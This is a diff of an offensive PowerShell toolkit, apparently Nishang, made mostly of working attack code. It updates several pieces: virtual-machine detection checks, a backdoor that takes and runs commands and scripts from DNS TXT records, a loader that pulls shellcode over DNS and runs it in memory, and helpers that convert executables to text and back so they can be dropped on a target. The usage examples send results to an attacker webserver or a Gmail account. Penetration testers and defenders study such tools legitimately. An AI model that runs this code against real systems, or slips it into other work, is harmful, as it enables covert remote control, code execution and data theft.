+            $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
+            if ($hyperv -match "vrtual")
+                {
+                    $hypervm = $true
+                }
+        }
             
-if (!$hypervm)
-    {
-        $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
-        if ($hyperv -match "vrtual")
-            {
-                $hypervm = $true
-            }
-    }
+    if (!$hypervm)
+        {
+            $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
+            if ($hyperv -match "vrtual")
+                {
+                    $hypervm = $true
+                }
+        }
 
-if (!$hypervm)
-    {
-        $hyperv = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
-        if (($hyperv -match "vmicheartbeat") -or ($hyperv -match "vmicvss") -or ($hyperv -match "vmicshutdown") -or ($hyperv -match "vmiexchange"))
-            {
-                $hypervm = $true
-            }
-    }
+    if (!$hypervm)
+        {
+            $hyperv = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
+            if (($hyperv -match "vmicheartbeat") -or ($hyperv -match "vmicvss") -or ($hyperv -match "vmicshutdown") -or ($hyperv -match "vmiexchange"))
+                {
+                    $hypervm = $true
+                }
+        }
    
-if ($hypervm)
-    {
+    if ($hypervm)
+        {
     
-        "This is a Hyper-V machine."
+            "This is a Hyper-V machine."
     
-    }
+        }
 
-#VMWARE
+    #VMWARE
 
-$vmware = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
-if (($vmware -match "vmdebug") -or ($vmware -match "vmmouse") -or ($vmware -match "VMTools") -or ($vmware -match "VMMEMCTL"))
-    {
-        $vmwarevm = $true
-    }
+    $vmware = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
+    if (($vmware -match "vmdebug") -or ($vmware -match "vmmouse") -or ($vmware -match "VMTools") -or ($vmware -match "VMMEMCTL"))
+        {
+            $vmwarevm = $true
+        }
 
-if (!$vmwarevm)
-    {
-        $vmware = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System\BIOS -Name SystemManufacturer
-        if ($vmware -match "vmware")
-            {
-                $vmwarevm = $true
-            }
-    }
+    if (!$vmwarevm)
+        {
+            $vmware = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System\BIOS -Name SystemManufacturer
+            if ($vmware -match "vmware")
+                {
+                    $vmwarevm = $true
+                }
+        }
     
-if (!$vmwarevm)
-    {
-        $vmware = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
-        if ($vmware -match "vmware")
-            {
-                $vmwarevm = $true
-            }
-    }
+    if (!$vmwarevm)
+        {
+            $vmware = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
+            if ($vmware -match "vmware")
+                {
+                    $vmwarevm = $true
+                }
+        }
 
-if (!$vmwarevm)
-    {
-        $vmware = Get-Process
-        if (($vmware -eq "vmwareuser.exe") -or ($vmware -match "vmwaretray.exe"))
-            {
-                $vmwarevm = $true
-            }
-    }
+    if (!$vmwarevm)
+        {
+            $vmware = Get-Process
+            if (($vmware -eq "vmwareuser.exe") -or ($vmware -match "vmwaretray.exe"))
+                {
+                    $vmwarevm = $true
+                }
+        }
 
-if ($vmwarevm)
-    {
+    if ($vmwarevm)
+        {
     
-        "This is a VMWare machine."
+            "This is a VMWare machine."
     
-    }
+        }
     
-#Virtual PC
+    #Virtual PC
 
-$vpc = Get-Process
-if (($vpc -eq "vmusrvc.exe") -or ($vpc -match "vmsrvc.exe"))
-    {
-    $vpcvm = $true
-    }
+    $vpc = Get-Process
+    if (($vpc -eq "vmusrvc.exe") -or ($vpc -match "vmsrvc.exe"))
+        {
+        $vpcvm = $true
+        }
 
-if (!$vpcvm)
-    {
-        $vpc = Get-Process
-        if (($vpc -eq "vmwareuser.exe") -or ($vpc -match "vmwaretray.exe"))
-            {
-                $vpcvm = $true
-            }
-    }
+    if (!$vpcvm)
+        {
+            $vpc = Get-Process
+            if (($vpc -eq "vmwareuser.exe") -or ($vpc -match "vmwaretray.exe"))
+                {
+                    $vpcvm = $true
+                }
+        }
 
-if (!$vpcvm)
-    {
-        $vpc = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
-        if (($vpc -match "vpc-s3") -or ($vpc -match "vpcuhub") -or ($vpc -match "msvmmouf"))
-            {
-                $vpcvm = $true
-            }
-    }
+    if (!$vpcvm)
+        {
+            $vpc = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
+            if (($vpc -match "vpc-s3") -or ($vpc -match "vpcuhub") -or ($vpc -match "msvmmouf"))
+                {
+                    $vpcvm = $true
+                }
+        }
 
-if ($vpcvm)
-    {
+    if ($vpcvm)
+        {
     
-    "This is a Virtual PC."
+        "This is a Virtual PC."
     
-    }
+        }
 
 
-#Virtual Box
+    #Virtual Box
 
-$vb = Get-Process
-if (($vb -eq "vboxservice.exe") -or ($vb -match "vboxtray.exe"))
-    {
+    $vb = Get-Process
+    if (($vb -eq "vboxservice.exe") -or ($vb -match "vboxtray.exe"))
+        {
     
-    $vbvm = $true
+        $vbvm = $true
     
-    }
-if (!$vbvm)
-    {
-        $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
-        if ($vb -match "vbox_")
-            {
-                $vbvm = $true
-            }
-    }
+        }
+    if (!$vbvm)
+        {
+            $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
+            if ($vb -match "vbox_")
+                {
+                    $vbvm = $true
+                }
+        }
 
-if (!$vbvm)
-    {
-        $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
-        if ($vb -match "vbox_")
-            {
-                $vbvm = $true
-            }
-    }
+    if (!$vbvm)
+        {
+            $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
+            if ($vb -match "vbox_")
+                {
+                    $vbvm = $true
+                }
+        }
 
     
-if (!$vbvm)
-    {
-        $vb = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
-        if ($vb -match "vbox")
-            {
-                $vbvm = $true
-            }
-    }
+    if (!$vbvm)
+        {
+            $vb = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
+            if ($vb -match "vbox")
+                {
+                    $vbvm = $true
+                }
+        }
 
 
 
-if (!$vbvm)
-    {
-        $vb = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
-        if ($vb -match "vbox")
-            {
-                 $vbvm = $true
-            }
-    }
+    if (!$vbvm)
+        {
+            $vb = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
+            if ($vb -match "vbox")
+                {
+                        $vbvm = $true
+                }
+        }
   
 
-if (!$vbvm)
-    {
-        $vb = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
-        if (($vb -match "VBoxMouse") -or ($vb -match "VBoxGuest") -or ($vb -match "VBoxService") -or ($vb -match "VBoxSF"))
-            {
-                $vbvm = $true
-            }
-    }
+    if (!$vbvm)
+        {
+            $vb = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
+            if (($vb -match "VBoxMouse") -or ($vb -match "VBoxGuest") -or ($vb -match "VBoxService") -or ($vb -match "VBoxSF"))
+                {
+                    $vbvm = $true
+                }
+        }
 
-if ($vbvm)
-    {
+    if ($vbvm)
+        {
     
-    "This is a Virtual Box."
+        "This is a Virtual Box."
     
-    }
+        }
 
 
 
-#Xen
+    #Xen
 
-$xen = Get-Process
+    $xen = Get-Process
 
-if ($xen -eq "xenservice.exe")
-    {
+    if ($xen -eq "xenservice.exe")
+        {
     
-    $xenvm = $true
+        $xenvm = $true
     
-    }
+        }
     
-if (!$xenvm)
-    {
-        $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
-        if ($xen -match "xen")
-            {
-                $xenvm = $true
-            }
-    }
+    if (!$xenvm)
+        {
+            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
+            if ($xen -match "xen")
+                {
+                    $xenvm = $true
+                }
+        }
 
-if (!$xenvm)
-    {
-        $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\DSDT
-        if ($xen -match "xen")
-            {
-                $xenvm = $true
-            }
-    }
+    if (!$xenvm)
+        {
+            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\DSDT
+            if ($xen -match "xen")
+                {
+                    $xenvm = $true
+                }
+        }
     
-if (!$xenvm)
-    {
-        $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
-        if ($xen -match "xen")
-            {
-                $xenvm = $true
-            }
-    }
+    if (!$xenvm)
+        {
+            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
+            if ($xen -match "xen")
+                {
+                    $xenvm = $true
+                }
+        }
 
     
-if (!$xenvm)
-    {
-       $xen = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
-        if (($xen -match "xenevtchn") -or ($xen -match "xennet") -or ($xen -match "xennet6") -or ($xen -match "xensvc") -or ($xen -match "xenvdb"))
-            {
-                $xenvm = $true
-            }
-    }
-
-
-if ($xenvm)
-    {
-    
-    "This is a Xen Machine."
-    
-    }
+    if (!$xenvm)
+        {
+            $xen = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
+            if (($xen -match "xenevtchn") -or ($xen -match "xennet") -or ($xen -match "xennet6") -or ($xen -match "xensvc") -or ($xen -match "xenvdb"))
+                {
+                    $xenvm = $true
+                }
+        }
 
 
-#QEMU
+    if ($xenvm)
+        {
+    
+        "This is a Xen Machine."
+    
+        }
 
-$qemu = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
-if ($qemu -match "qemu")
-    {
-    
-        $qemuvm = $true
-    
-    }
-    
-if (!$qemuvm)
-    {
-    $qemu = Get-ItemProperty hklm:HARDWARE\DESCRIPTION\System\CentralProcessor\0 -Name ProcessorNameString
+
+    #QEMU
+
+    $qemu = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
     if ($qemu -match "qemu")
         {
+    
             $qemuvm = $true
+    
         }
-    }    
+    
+    if (!$qemuvm)
+        {
+        $qemu = Get-ItemProperty hklm:HARDWARE\DESCRIPTION\System\CentralProcessor\0 -Name ProcessorNameString
+        if ($qemu -match "qemu")
+            {
+                $qemuvm = $true
+            }
+        }    
 
-if ($qemuvm)
-    {
+    if ($qemuvm)
+        {
     
-    "This is a Qemu machine."
+        "This is a Qemu machine."
     
-    }
-else
-    {
-    "No Virtual Machine detected."
-    }
+        }
     
 }
 
@@ -1133,10 +1074,10 @@ function DNS_TXT_Pwnage
 Payload which acts as a backdoor and is capable of recieving commands and PowerShell scripts from DNS TXT queries.
 
 .DESCRIPTION
-This payload continuously queries a subdomain's TXT records. It could be
-sent commands and powershell scripts to be executed on the target machine by
-TXT messages of a domain.
-
+This payload continuously queries a subdomain's TXT records. It could be sent commands and powershell scripts to be 
+executed on the target machine by TXT messages of a domain. The powershell scripts which would be served as TXT record
+MUST be encoded using Invoke-Encode. 
+If using DNS or Webserver ExfilOption, use Invoke-Decode.
 .PARAMETER startdomain
 The domain (or subdomain) whose TXT records would be checked regularly for further instructions.
 
@@ -1147,7 +1088,7 @@ The domain (or subdomain) whose TXT records would be checked regularly for furth
 The domain (or subdomain) whose TXT records would be used to issue commands to the payload.
 
 .PARAMETER psstring
- The string, if responded by TXT record of startdomain, will make the payload  query "psdomain" for base64 encoded powershell script. 
+ The string, if responded by TXT record of startdomain, will make the payload  query "psdomain" for encoded powershell script. 
 
 .PARAMETER psdomain
 The domain (or subdomain) which would be used to provide powershell scripts from its TXT records. 
@@ -1159,30 +1100,10 @@ The string, if responded by TXT record of startdomain, will stop this payload on
 Authoritative Name Server for the domains (or startdomain in case you are using separate domains). Startdomain 
 would be changed for commands and an authoritative reply shoudl reflect changes immediately.
 
-.PARAMETER exfil
-Use this parameter to use exfiltration methods to return results of the backdoor.
-
-.PARAMETER dev_key
-The Unique API key provided by pastebin when you register a free account.
-Unused for tinypaste.
-Unused for gmail option.
-
-.PARAMETER username
-Username for the pastebin account where keys would be pasted.
-Username for the tinypaste account where keys would be pasted.
-Username for the gmail account where attachment would be sent as an attachment.
-
-.PARAMETER password
-Password for the pastebin account where keys would be pasted.
-Password for the tinypaste account where keys would be pasted.
-Password for the gmail account where keys would be sent.
-
-.PARAMETER keyoutoption
-The method you want to use for exfitration of data.
-"0" for displaying on console
-"1" for pastebin.
-"2" for gmail
-"3" for tinypaste   
+.PARAMETER NoLoadFunction
+This parameter is used for specifying that the script used in txt records $psdomain does NOT contain a function.
+If the parameter is not specified the payload assumes that the script pulled from txt records would need function name to be executed.
+This would be the case if you are using Nishang scripts with this backdoor.
 
 .EXAMPLE
 PS > DNS_TXT_Pwnage
@@ -1190,56 +1111,59 @@ The payload will ask for all required options.
 
 .EXAMPLE
 PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript enscript.alteredsecurity.com stop ns8.zoneedit.com
-In the above example if you want to execute commands. TXT record of start.alteredsecurity.com must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
-you want to execute. The TXT record could be changed live and the payload will pick up updated record to execute new command.
+In the above example if you want to execute commands. TXT record of start.alteredsecurity.com
+must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
+you want to execute. The TXT record could be changed live and the payload will pick up updated 
+record to execute new command.
 
 To execute a script in above example, start.alteredsecurity.com must contain "startscript". As soon it matches, the payload will query 
 psdomain looking for a base64encoded powershell script. Use the StringToBase64 function to encode scripts to base64.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript enscript.alteredsecurity.com stop ns8.zoneedit.com -exfil  <devkey> <username> <password> <keyoutoption>
-Use above command for using exfiltration methods.
+PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript enscript.alteredsecurity.com stop ns8.zoneedit.com | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+Use above command for using sending POST request to your webserver which is able to log the requests.
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 #>
 
 
-    [CmdletBinding(DefaultParameterSetName="noexfil")]
-    Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
-    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$startdomain,
-    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$cmdstring,
-    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$commanddomain,
-    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$psstring,
-    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")] [String]$psdomain,
-    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 5, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
-    [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 6, Mandatory = $True, Parametersetname="noexfil")] [String]$AuthNS,    
-    [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
-    [Parameter(Position = 8, Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 9, Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 10, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
+    [CmdletBinding(DefaultParameterSetName="noexfil")] Param(
 
-    $modulepath = Split-Path $script:MyInvocation.MyCommand.Path
-    $modulename = $script:MyInvocation.MyCommand.Name
-    $name = "$modulepath\$modulename"
-    
-    if ($exfil -eq $True)
-    {
-        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-DNS_TXT_Pwnage $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $dev_key $username $password $keyoutoption $exfil"
-        Start-Process powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
-    }
-    else
-    {
-        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-DNS_TXT_Pwnage $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS"
-        Start-Process powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
-    }
- }
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $startdomain,
 
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String]
+        $cmdstring,
 
-###########################################################Logic for DNS_TXT_Pwnage backdoor######################################################
- function Logic-DNS_TXT_Pwnage ($Startdomain, $cmdstring, $commanddomain, $psstring, $psdomain, $Stopstring, $AuthNS, $dev_key, $username, $password, $keyoutoption, $exfil)
- {  
+        [Parameter(Position = 2, Mandatory = $True)]
+        [String]
+        $commanddomain,
+
+        [Parameter(Position = 3, Mandatory = $True)]
+        [String]
+        $psstring,
+
+        [Parameter(Position = 4, Mandatory = $True)]
+        [String]
+        $psdomain,
+
+        [Parameter(Position = 5, Mandatory = $True)]
+
+        [String]
+        $StopString,
+
+        [Parameter(Position = 6, Mandatory = $True)]
+        [String]$AuthNS,
+
+        [Parameter()]
+        [Switch]
+        $NoLoadFunction
+        
+    )    
 
     while($true)
     {
@@ -1257,11 +1181,6 @@ http://code.google.com/p/nishang
             $pastevalue = Invoke-Expression $command[1]
             $pastevalue
             $exec++
-            if ($exfil -eq $True)
-            {
-                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
-                Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
-            }
             if ($exec -eq 1)
             {
                 Start-Sleep -Seconds 60
@@ -1278,17 +1197,28 @@ http://code.google.com/p/nishang
             {
                 $tmp1 = $tmp1 + $txt
             }
-            $command = $tmp1 -replace '\s+', "" -replace "`"", ""
-            $pastevalue = powershell.exe -encodedcommand $command
-            $pastevalue
-            #Problem with using stringtobase64 to encode a file. After decoding it creates spaces in between the script.
-            #A temporary workaround is using a semicolon ";" separated script in one line.
-            $exec++
-            if ($exfil -eq $True)
+            $encdata = $tmp1 -replace '\s+', "" -replace "`"", ""
+            #Decode the downloaded powershell script. The decoding logic is of Invoke-Decode in Utility directory.
+            $dec = [System.Convert]::FromBase64String($encdata)
+            $ms = New-Object System.IO.MemoryStream
+            $ms.Write($dec, 0, $dec.Length)
+            $ms.Seek(0,0) | Out-Null
+            $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
+            $sr = New-Object System.IO.StreamReader($cs)
+            $command = $sr.readtoend()
+            # Check for the function loaded by the script.
+            $preloading = Get-ChildItem function:\
+            Invoke-Expression $command
+            $postloading = Get-ChildItem function:\
+            $diffobj = Compare-Object $preloading $postloading
+            $FunctionName = $diffobj.InputObject.Name
+            $pastevalue = Invoke-Expression $FunctionName
+            if ($NoLoadFunction -eq $True)
             {
-                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
-                Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
+                $pastevalue = Invoke-Expression $command
             }
+            $pastevalue    
+            $exec++
             if ($exec -eq 1)
             {
                 Start-Sleep -Seconds 60
@@ -1303,7 +1233,7 @@ http://code.google.com/p/nishang
     }
 }
 
-
+#####################Execute shellcode in-memory. The shellcode is recieved from DNS TXT queries.#####################
 
 function Execute-DNSTXT-Code
 {
@@ -1326,7 +1256,7 @@ The domain (or subdomain) whose TXT records would hold 32-bit shellcode.
 .PARAMETER shellcode64
 The domain (or subdomain) whose TXT records would hold 64-bit shellcode.
 
-.PARAMETER AuthNS
+ .PARAMETER AUTHNS
 Authoritative Name Server for the domains.
 
 
@@ -1340,7 +1270,7 @@ Use above from non-interactive shell.
 
 .LINK
 http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 
 .NOTES
 The code execution logic is based on this post by Matt.
@@ -1348,20 +1278,20 @@ http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
 #>
     
     
-Param( [Parameter(Position = 0, Mandatory = $True)] [String]$shellcode32,
-[Parameter(Position = 1, Mandatory = $True)] [String]$shellcode64,
-[Parameter(Position = 2, Mandatory = $True)] [String]$AuthNS)
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $ShellCode32,
 
-$modulepath = Split-Path $script:MyInvocation.MyCommand.Path
-$modulename = $script:MyInvocation.MyCommand.Name
-$name = "$modulepath\$modulename"
-$Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-Execute-DNSTXT-Code $shellcode32 $shellcode64 $AuthNS"
-Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String]
+        $ShellCode64,
 
-}
+        [Parameter(Position = 2, Mandatory = $True)]
+        [String]
+        $AuthNS
+    )
 
-function Logic-Execute-DNSTXT-Code($shellcode32, $shellcode64, $AuthNS)
-{
     $code = (Invoke-Expression "nslookup -querytype=txt $shellcode32 $AuthNS")  
     $tmp = $code | select-string -pattern "`"" 
     $tmp1 = $tmp -split("`"")[0] 
@@ -1417,9 +1347,19 @@ PS > ExetoText evil.exe evil.txt
 
 .LINK
 http://www.exploit-monday.com/2011/09/dropping-executables-with-powershell.html
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 #>
-    Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $EXE, [Parameter(Position = 1, Mandatory = $True)] [String]$Filename)
+
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $EXE, 
+        
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String]
+        $Filename
+    )
+
     [byte[]] $hexdump = get-content -encoding byte -path "$EXE"
     [System.IO.File]::WriteAllLines("$Filename", ([string]$hexdump))
 }
@@ -1469,7 +1409,7 @@ PS> Brute-Force -Identity "http://www.something.com" -UserName user001 -Password
 .LINK
 http://www.truesec.com
 http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/03/use-powershell-to-security-test-sql-server-and-sharepoint.aspx
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 
 .NOTES
 Goude 2012, TreuSec
@@ -1641,14 +1581,14 @@ Port-Scan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -Sca
 .LINK
 http://www.truesec.com
 http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/02/use-powershell-for-network-host-and-port-discovery-sweeps.aspx
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
     
 .NOTES
 Goude 2012, TrueSec
 #>
 
 
-Param(
+[CmdletBinding()] Param(
     [parameter(Mandatory = $true,
       Position = 0)]
     [ValidatePattern("\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")]
@@ -1726,21 +1666,39 @@ function StringtoBase64
 Helper function which encodes a string to base64 string.
 
 .DESCRIPTION
-This payload encodes the given string to base64 string.
-
+This payload encodes the given string to base64 string and writes it to base64encoded.txt in current directory.
 .PARAMETER Str
 The string to be encoded
 
+.PARAMETER OutputFile
+The path of the output file. Default is "encoded.txt" in the current working directory.
+
+.PARAMETER IsString
+Use this to specify if you are passing a string ins place of a filepath.
+
 .EXAMPLE
-PS > StringToBase64 "start-process calc.exe"
+PS > StringToBase64 "start-process calc.exe" -IsString
 
 .LINK
 http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 #>
 
-Param( [Parameter(Position = 0, Mandatory = $True)] [String] $Str, [Switch] $IsString)
-if($IsString -eq $true)
+
+    [CmdletBinding()] 
+        Param( [Parameter(Position = 0, Mandatory = $False)]
+        [String]
+        $Str,
+
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $outputfile=".\base64encoded.txt", 
+
+        [Switch]
+        $IsString
+    )
+
+   if($IsString -eq $true)
     {
     
         $utfbytes  = [System.Text.Encoding]::Unicode.GetBytes($Str)
@@ -1752,8 +1710,11 @@ if($IsString -eq $true)
     }
 
   $base64string = [System.Convert]::ToBase64String($utfbytes)
-  $base64string
+  Out-File -InputObject $base64string -Encoding ascii -FilePath "$outputfile"
+  Write-Output "Encoded data written to file $outputfile"
 }
+
+
 
 
 ####################################Convert an executable file in hex format to executable (.exe)########################################
@@ -1763,29 +1724,39 @@ function TexttoEXE
 
 <#
 .SYNOPSIS
-Payload to convert a PE file in hex format to executable
+Function to convert a PE file in hex format to executable
 
 .DESCRIPTION
-This payload converts a PE file in hex to executable.
+This function converts a PE file in hex to executable and writes it to user temp.
 
 .PARAMETER Filename
-Name of the hex text file from which  executable will be created.
+Path of the hex text file from which  executable will be created.
 
 .PARAMETER EXE
-Name of the created executable
+Path where the executable should be created.
 
 .EXAMPLE
-PS > TexttoExe evil.text evil.exe
+PS > TexttoExe C:\evil.text C:\exe\evil.exe
 
 .LINK
 http://www.exploit-monday.com/2011/09/dropping-executables-with-powershell.html
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 #>
 
-    Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $Filename, [Parameter(Position = 1, Mandatory = $True)] [String]$EXE)
-    [string]$hexdump = get-content -path "$Filename"
+
+    [CmdletBinding()] Param ( 
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $FileName,
+    
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String]$EXE
+    )
+    
+    [String]$hexdump = get-content -path "$Filename"
     [Byte[]] $temp = $hexdump -split ' '
-    [System.IO.File]::WriteAllBytes("$EXE", $temp)
+    [System.IO.File]::WriteAllBytes($EXE, $temp)
+    Write-Output "Executable written to file $EXE"
 }
 
 
@@ -1813,101 +1784,65 @@ The URL which the payload would check for instructions to stop.
 .PARAMETER StopString
 The string which if found at CheckURL will stop the payload.
 
-PARAMETER exfil
-Use this parameter to use exfiltration methods for returning the results.
-
-.PARAMETER dev_key
-The Unique API key provided by pastebin when you register a free account.
-Unused for tinypaste.
-Unused for gmail option.
-
-.PARAMETER username
-Username for the pastebin account where data would be pasted.
-Username for the tinypaste account where data would be pasted.
-Username for the gmail account where attachment would be sent as an attachment.
-
-.PARAMETER password
-Password for the pastebin account where data would be pasted.
-Password for the tinypaste account where data would be pasted.
-Password for the gmail account where data would be sent.
-
-.PARAMETER keyoutoption
-The method you want to use for exfitration of data.
-"0" for displaying on console
-"1" for pastebin.
-"2" for gmail
-"3" for tinypaste   
-
 .EXAMPLE
 PS > Execute-OnTime http://example.com/script.ps1 hh:mm http://pastebin.com/raw.php?i=Zhyf8rwh stoppayload
 
 EXAMPLE
-PS > Execute-OnTime http://pastebin.com/raw.php?i=Zhyf8rwh hh:mm http://pastebin.com/raw.php?i=jqP2vJ3x stoppayload -exfil <devkey> <username> <password> <keyoutoption>
+PS > Execute-OnTime http://pastebin.com/raw.php?i=Zhyf8rwh hh:mm http://pastebin.com/raw.php?i=jqP2vJ3x | Do-Exfiltration -ExfilOption gmail -username <> -Password <>
 
-Use above when using the payload from non-interactive shells.
+Use above command for data exfiltration to gmail
+
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 #>
 
 
 
-    [CmdletBinding(DefaultParameterSetName="noexfil")]
-    Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
-    [Parameter(Position = 0, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String] $URL,
-    [Parameter(Position = 1, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$time,
-    [Parameter(Position = 2, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
-    [Parameter(Position = 3, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
-    [Parameter(Position = 4,Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
-    [Parameter(Position = 5,Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 6,Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 7,Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
+    [CmdletBinding()] Param(
 
-    $modulepath = Split-Path $script:MyInvocation.MyCommand.Path
-    $modulename = $script:MyInvocation.MyCommand.Name
-    $name = "$modulepath\$modulename"
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $PayloadURL,
+
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String]
+        $time,
+
+        [Parameter(Position = 2, Mandatory = $True)]
+        [String]
+        $CheckURL,
+
+        [Parameter(Position = 3, Mandatory = $True)]
+        [String]
+        $StopString
+
+    )
+
     
-    if ($exfil -eq $True)
-    {
-        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-Execute-OnTime $URL $time $CheckURL $StopString $dev_key $username $password $keyoutoption $exfil"
-        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
-    }
-    else
-    {
-        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-Execute-OnTime $URL $time $CheckURL $StopString"
-        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
-    }
-}
 
-function Logic-Execute-OnTime ($URL, $time, $CheckURL, $StopString, $dev_key, $username, $password, $keyoutoption, $exfil)
-{
-    $exec = 0
